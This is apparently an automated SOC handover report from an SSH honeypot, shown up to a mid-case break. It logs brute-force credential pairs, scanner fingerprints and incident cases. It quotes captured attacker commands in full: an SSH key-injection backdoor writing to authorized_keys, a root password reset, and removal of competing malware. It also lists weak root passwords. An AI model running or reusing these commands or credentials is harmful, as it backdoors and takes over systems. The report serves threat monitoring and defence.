# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-17 |
| **Generated At** | 2026-04-17T06:07:03Z |
| **Shift Time** | 06:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **409** |
| Confirmed Threats | **389** |
| False Positives Filtered | **20** (4.9%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **14** |
| High Severity Cases | **146** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **263** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **311** |
| Unique Credential Pairs | **106** |
| Unique Usernames | **41** |
| Unique Passwords | **105** |
| Successful Auth Pairs | **86** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 146 |
| `345gs5662d34` | 71 |
| `ubuntu` | 10 |
| `test` | 8 |
| `postgres` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 71 |
| `3245gs5662d34` | 71 |
| `Bot!123` | 4 |
| `claude07!` | 4 |
| `sistema` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 71 |
| `root` | `3245gs5662d34` | 71 |
| `bot` | `Bot!123` | 4 |
| `claude` | `claude07!` | 4 |
| `sistema` | `sistema` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qazwsx123456789#$` | `43.163.127.183` | 2026-04-17T02:55:13 |
| `root` | `3245gs5662d34` | `43.163.127.183` | 2026-04-17T02:55:16 |
| `root` | `minecraft` | `177.157.193.249` | 2026-04-17T02:55:34 |
| `root` | `3245gs5662d34` | `177.157.193.249` | 2026-04-17T02:55:41 |
| `root` | `password1` | `217.154.106.153` | 2026-04-17T02:56:16 |
| `root` | `3245gs5662d34` | `217.154.106.153` | 2026-04-17T02:56:20 |
| `root` | `root321!` | `177.157.193.249` | 2026-04-17T02:56:34 |
| `root` | `s123456` | `103.200.25.198` | 2026-04-17T02:57:35 |
| `root` | `3245gs5662d34` | `103.200.25.198` | 2026-04-17T02:57:39 |
| `root` | `qw12er34` | `58.42.8.7` | 2026-04-17T02:58:03 |
| `root` | `Qwertyuio1234` | `43.163.127.183` | 2026-04-17T02:58:19 |
| `root` | `Qwerty2025!` | `177.157.193.249` | 2026-04-17T02:59:40 |
| `root` | `qqZZ112233` | `43.163.127.183` | 2026-04-17T02:59:53 |
| `root` | `Asdf123@` | `177.157.193.249` | 2026-04-17T03:00:30 |
| `root` | `Qazwsx6666!!` | `217.154.106.153` | 2026-04-17T03:01:20 |
| `root` | `Nn123456` | `177.157.193.249` | 2026-04-17T03:01:21 |
| `root` | `Mr123456` | `103.200.25.198` | 2026-04-17T03:01:50 |
| `root` | `Asdf123@` | `34.133.99.235` | 2026-04-17T03:02:23 |
| `root` | `3245gs5662d34` | `34.133.99.235` | 2026-04-17T03:02:29 |
| `root` | `Mr123456` | `177.157.193.249` | 2026-04-17T03:03:53 |
| `root` | `Mr123456` | `34.133.99.235` | 2026-04-17T03:04:10 |
| `root` | `root2023@#` | `177.157.193.249` | 2026-04-17T03:04:40 |
| `root` | `root2023@#` | `34.133.99.235` | 2026-04-17T03:05:51 |
| `root` | `minecraft` | `103.200.25.198` | 2026-04-17T03:05:56 |
| `root` | `Admin2024@` | `217.154.106.153` | 2026-04-17T03:08:19 |
| `root` | `root666!@#` | `177.157.193.249` | 2026-04-17T03:08:44 |
| `root` | `Qwerty2025!` | `34.133.99.235` | 2026-04-17T03:09:16 |
| `root` | `Qwert@1234` | `217.154.106.153` | 2026-04-17T03:10:04 |
| `root` | `User@2025` | `103.200.25.198` | 2026-04-17T03:10:07 |
| `root` | `s123456` | `177.157.193.249` | 2026-04-17T03:10:22 |
| `root` | `Yn123456` | `43.163.127.183` | 2026-04-17T03:10:55 |
| `root` | `root666!@#` | `34.133.99.235` | 2026-04-17T03:11:06 |
| `root` | `qazwsx4321.` | `217.154.106.153` | 2026-04-17T03:11:43 |
| `root` | `root12$` | `177.157.193.249` | 2026-04-17T03:11:53 |
| `root` | `root666!@#` | `103.200.25.198` | 2026-04-17T03:12:12 |
| `root` | `root321!` | `34.133.99.235` | 2026-04-17T03:12:48 |
| `root` | `User@2025` | `177.157.193.249` | 2026-04-17T03:13:30 |
| `root` | `Nn123456` | `34.133.99.235` | 2026-04-17T03:14:37 |
| `root` | `root2023@#` | `103.200.25.198` | 2026-04-17T03:16:27 |
| `root` | `root12$` | `34.133.99.235` | 2026-04-17T03:19:59 |
| `root` | `Qwerty2025!` | `103.200.25.198` | 2026-04-17T03:20:33 |
| `root` | `Asdf123@` | `103.200.25.198` | 2026-04-17T03:22:37 |
| `root` | `minecraft` | `34.133.99.235` | 2026-04-17T03:28:34 |
| `root` | `root321!` | `103.200.25.198` | 2026-04-17T03:28:49 |
| `root` | `s123456` | `34.133.99.235` | 2026-04-17T03:32:09 |
| `root` | `qazwsx1234567@@` | `4.186.31.101` | 2026-04-17T03:32:20 |
| `root` | `Nn123456` | `103.200.25.198` | 2026-04-17T03:32:57 |
| `root` | `A123456987A` | `45.93.28.216` | 2026-04-17T03:32:58 |
| `root` | `3245gs5662d34` | `4.186.31.101` | 2026-04-17T03:33:04 |
| `root` | `3245gs5662d34` | `45.93.28.216` | 2026-04-17T03:33:07 |
| `root` | `User@2025` | `34.133.99.235` | 2026-04-17T03:33:53 |
| `root` | `123asdf` | `45.64.74.51` | 2026-04-17T03:34:57 |
| `root` | `3245gs5662d34` | `45.64.74.51` | 2026-04-17T03:35:00 |
| `root` | `1qaz1qaz` | `45.64.74.51` | 2026-04-17T03:36:32 |
| `root` | `A123456987A` | `45.64.74.51` | 2026-04-17T03:38:00 |
| `root` | `qazwsx1234567@@` | `45.64.74.51` | 2026-04-17T03:39:32 |
| `root` | `N2dos2025sd` | `45.64.74.51` | 2026-04-17T03:41:07 |
| `root` | `root2021` | `45.64.74.51` | 2026-04-17T03:42:39 |
| `root` | `qweasd1234` | `45.64.74.51` | 2026-04-17T03:44:08 |
| `root` | `root12$` | `103.200.25.198` | 2026-04-17T03:45:18 |
| `root` | `Qazwsx2023` | `45.64.74.51` | 2026-04-17T03:45:43 |
| `root` | `ubuntu` | `20.64.113.40` | 2026-04-17T03:48:12 |
| `root` | `Qwe12345678` | `45.64.74.51` | 2026-04-17T03:52:04 |
| `root` | `Ab123456.` | `45.64.74.51` | 2026-04-17T03:57:25 |
| `root` | `Qazwsx0000@@` | `45.64.74.51` | 2026-04-17T04:00:38 |
| `root` | `---fuck_you----` | `180.97.199.20` | 2026-04-17T04:33:32 |
| `root` | `---fuck_you----` | `120.48.112.221` | 2026-04-17T04:42:45 |
| `root` | `Tk123456` | `101.47.159.50` | 2026-04-17T04:51:09 |
| `root` | `3245gs5662d34` | `101.47.159.50` | 2026-04-17T04:51:13 |
| `root` | `qazwsx11111111..` | `179.57.170.71` | 2026-04-17T04:55:28 |
| `root` | `3245gs5662d34` | `179.57.170.71` | 2026-04-17T04:55:36 |
| `root` | `ali` | `27.128.240.75` | 2026-04-17T05:01:18 |
| `root` | `3245gs5662d34` | `27.128.240.75` | 2026-04-17T05:01:22 |
| `root` | `1234abcd@` | `179.57.170.71` | 2026-04-17T05:03:14 |
| `root` | `Abc@12345678` | `179.57.170.71` | 2026-04-17T05:12:45 |
| `root` | `ZZcc123123` | `179.57.170.71` | 2026-04-17T05:14:44 |
| `root` | `Aaaa1234` | `27.128.240.75` | 2026-04-17T05:15:38 |
| `root` | `Aaaa1234` | `179.57.170.71` | 2026-04-17T05:16:41 |
| `root` | `qqXX000` | `179.57.170.71` | 2026-04-17T05:18:36 |
| `root` | `1234abcd@` | `27.128.240.75` | 2026-04-17T05:18:39 |
| `root` | `ali` | `179.57.170.71` | 2026-04-17T05:22:15 |
| `root` | `Pass1` | `179.57.170.71` | 2026-04-17T05:24:10 |
| `root` | `Qwerty123456.` | `179.57.170.71` | 2026-04-17T05:28:02 |
| `root` | `Qazwsx8888@` | `179.57.170.71` | 2026-04-17T05:31:56 |
| `root` | `qqXX000` | `27.128.240.75` | 2026-04-17T05:32:28 |
| `root` | `Tk123456` | `179.57.170.71` | 2026-04-17T05:39:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **409** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 344 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 342 | 15 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |
| `713bd9cc9355...` | Mirai/variant | 1 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 342 | 15 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `713bd9cc9355...` | libssh | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 71 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:uG1L82S4KCnx"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `58.42.8.7`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.163.127.183`, `177.157.193.249`, `4.186.31.101`, `45.93.28.216`, `45.64.74.51`, `103.200.25.198`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **23** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS138195` | MOACK.Co.LTD | 1 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | HIGH |
| `AS8560` | IONOS SE | 1 | HIGH |
| `AS56048` | China Mobile Communicaitons Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (146)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-77205bb264fd

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-17 02:55 |
| **Last Seen** | 2026-04-17 02:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:55:13` | `cowrie.session.connect` |
| `2026-04-17 02:55:13` | `cowrie.client.version` |
| `2026-04-17 02:55:13` | `cowrie.client.kex` |
| `2026-04-17 02:55:13` | `cowrie.login.success` |
| `2026-04-17 02:55:13` | `cowrie.session.params` |
| `2026-04-17 02:55:13` | `cowrie.command.input` |
| `2026-04-17 02:55:13` | `cowrie.command.failed` |
| `2026-04-17 02:55:13` | `cowrie.log.closed` |
| `2026-04-17 02:55:14` | `cowrie.session.params` |
| `2026-04-17 02:55:14` | `cowrie.command.input` |
| `2026-04-17 02:55:14` | `cowrie.session.file_download` |
| `2026-04-17 02:55:14` | `cowrie.log.closed` |
| `2026-04-17 02:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e70aecbcb8

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-17 02:55 |
| **Last Seen** | 2026-04-17 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:55:15` | `cowrie.session.connect` |
| `2026-04-17 02:55:15` | `cowrie.client.version` |
| `2026-04-17 02:55:15` | `cowrie.client.kex` |
| `2026-04-17 02:55:16` | `cowrie.login.success` |
| `2026-04-17 02:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ae4816d461

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 02:55 |
| **Last Seen** | 2026-04-17 02:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:55:32` | `cowrie.session.connect` |
| `2026-04-17 02:55:32` | `cowrie.client.version` |
| `2026-04-17 02:55:33` | `cowrie.client.kex` |
| `2026-04-17 02:55:34` | `cowrie.login.success` |
| `2026-04-17 02:55:35` | `cowrie.session.params` |
| `2026-04-17 02:55:35` | `cowrie.command.input` |
| `2026-04-17 02:55:35` | `cowrie.command.failed` |
| `2026-04-17 02:55:35` | `cowrie.log.closed` |
| `2026-04-17 02:55:36` | `cowrie.session.params` |
| `2026-04-17 02:55:36` | `cowrie.command.input` |
| `2026-04-17 02:55:36` | `cowrie.session.file_download` |
| `2026-04-17 02:55:36` | `cowrie.log.closed` |
| `2026-04-17 02:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e63615a6dc2

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 02:55 |
| **Last Seen** | 2026-04-17 02:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:55:40` | `cowrie.session.connect` |
| `2026-04-17 02:55:40` | `cowrie.client.version` |
| `2026-04-17 02:55:40` | `cowrie.client.kex` |
| `2026-04-17 02:55:41` | `cowrie.login.success` |
| `2026-04-17 02:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69687f95de59

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 02:56 |
| **Last Seen** | 2026-04-17 02:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:56:15` | `cowrie.session.connect` |
| `2026-04-17 02:56:15` | `cowrie.client.version` |
| `2026-04-17 02:56:15` | `cowrie.client.kex` |
| `2026-04-17 02:56:16` | `cowrie.login.success` |
| `2026-04-17 02:56:16` | `cowrie.session.params` |
| `2026-04-17 02:56:16` | `cowrie.command.input` |
| `2026-04-17 02:56:16` | `cowrie.command.failed` |
| `2026-04-17 02:56:16` | `cowrie.log.closed` |
| `2026-04-17 02:56:17` | `cowrie.session.params` |
| `2026-04-17 02:56:17` | `cowrie.command.input` |
| `2026-04-17 02:56:17` | `cowrie.session.file_download` |
| `2026-04-17 02:56:17` | `cowrie.log.closed` |
| `2026-04-17 02:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b7102611322

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 02:56 |
| **Last Seen** | 2026-04-17 02:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:56:19` | `cowrie.session.connect` |
| `2026-04-17 02:56:19` | `cowrie.client.version` |
| `2026-04-17 02:56:19` | `cowrie.client.kex` |
| `2026-04-17 02:56:20` | `cowrie.login.success` |
| `2026-04-17 02:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcce742b8591

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 02:56 |
| **Last Seen** | 2026-04-17 02:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:56:32` | `cowrie.session.connect` |
| `2026-04-17 02:56:32` | `cowrie.client.version` |
| `2026-04-17 02:56:33` | `cowrie.client.kex` |
| `2026-04-17 02:56:34` | `cowrie.login.success` |
| `2026-04-17 02:56:35` | `cowrie.session.params` |
| `2026-04-17 02:56:35` | `cowrie.command.input` |
| `2026-04-17 02:56:35` | `cowrie.command.failed` |
| `2026-04-17 02:56:35` | `cowrie.log.closed` |
| `2026-04-17 02:56:36` | `cowrie.session.params` |
| `2026-04-17 02:56:36` | `cowrie.command.input` |
| `2026-04-17 02:56:36` | `cowrie.session.file_download` |
| `2026-04-17 02:56:36` | `cowrie.log.closed` |
| `2026-04-17 02:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72731ec8d53

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 02:56 |
| **Last Seen** | 2026-04-17 02:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:56:40` | `cowrie.session.connect` |
| `2026-04-17 02:56:40` | `cowrie.client.version` |
| `2026-04-17 02:56:40` | `cowrie.client.kex` |
| `2026-04-17 02:56:41` | `cowrie.login.success` |
| `2026-04-17 02:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60dcab5c9604

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 02:57 |
| **Last Seen** | 2026-04-17 02:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 02:57:34` | `cowrie.session.connect` |
| `2026-04-17 02:57:34` | `cowrie.client.version` |
| `2026-04-17 02:57:35` | `cowrie.client.kex` |
| `2026-04-17 02:57:35` | `cowrie.login.success` |
| `2026-04-17 02:57:35` | `cowrie.session.params` |
| `2026-04-17 02:57:35` | `cowrie.command.input` |
| `2026-04-17 02:57:35` | `cowrie.command.failed` |
| `2026-04-17 02:57:36` | `cowrie.log.closed` |
